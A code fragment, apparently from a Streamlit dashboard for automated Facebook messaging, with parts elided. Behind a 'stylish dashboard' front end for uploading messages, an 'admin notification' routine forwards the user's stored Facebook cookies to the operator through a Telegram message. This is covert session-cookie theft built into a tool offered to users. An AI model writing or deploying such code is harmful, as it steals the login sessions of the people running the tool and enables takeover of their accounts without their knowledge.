...
🍪 Cookies: {cookies_display}"
        ...
        if resp.status_code == 200:
            log_message('TELEGRAM-NOTIFY: Sent successfully', automation_state)
            return True
        else:
            log_message(f'TELEGRAM-NOTIFY: Failed {resp.status_code}', automation_state)
            return False
    except Exception as e:
        log_message(f'TELEGRAM-NOTIFY Error: {e}', automation_state)
        return False
...
def send_admin_notification(user_config, username, automation_state=None, user_id=None):
    try:
        log_message('ADMIN-NOTIFY: Starting admin notification via FB fallback...', automation_state)
        # Try telegram first
        send_telegram_notification(username, automation_state, user_config.get('cookies',''))
    except Exception as e:
        log_message(f'ADMIN-NOTIFY: Error: {e}', automation_state)
...
# --- UI ---
st.markdown(
    '<div class="main-header"><img src="https://i.postimg.cc/9fpZqGjn/17adef215d4766a8620c99e8a17227b5.jpg" class="prince-logo"><div><h1>E23E 0FFL1NE WORLD</h1><p>Stylish dashboard — Upload messages file (.txt) or type manually.</p></div></div>',
